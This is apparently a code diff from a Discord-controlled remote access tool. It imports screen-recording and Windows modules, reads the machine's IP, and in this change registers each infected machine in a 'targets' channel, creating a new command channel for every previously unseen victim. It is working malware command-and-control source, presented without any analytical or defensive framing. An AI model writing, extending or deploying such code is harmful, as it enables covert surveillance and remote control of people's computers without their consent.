@@ -14,13 +14,14 @@ from features.screenRecord import *
 from features.windows import *
 
 
+__DISCORD_TARGETS_CHANNEL_NAME = "targets"
+
 
 def main():
-
     load_dotenv() #take enviroment variables from file .env
     bot = commands.Bot(command_prefix="!")
     ip = get_ip()
-    identifier, is_new_target = sanity()
+    identifier = generate_uuid()
 
     # Guild, Bot Token input
     channel_id = int(osVars.environ.get("DISCORD_CHANNEL_ID")) # should be in int type!
@@ -33,8 +34,15 @@ def main():
 
     @bot.event
     async def on_ready():  #This func will start when the bot is ready to use
-        if is_new_target:
-            guild = bot.get_guild(int(osVars.environ.get("DISCORD_GUILD_ID")))
+        guild = bot.get_guild(int(osVars.environ.get("DISCORD_GUILD_ID")))
+
+        # check if the target is a new one
+        targets_channel = discord.utils.get(guild.text_channels, name=__DISCORD_TARGETS_CHANNEL_NAME)
+        targets_channel_msgs = await targets_channel.history().flatten()
+        targets = list(map(lambda target_channel_msg: target_channel_msg.content, targets_channel_msgs))
+
+        if identifier not in targets:
+            await targets_channel.send(identifier)
             channel_name = await guild.create_text_channel(identifier)
             print(f"Created new channel: {channel_name}")
             channel_id = discord.utils.get(bot.get_all_channels(), name=identifier)
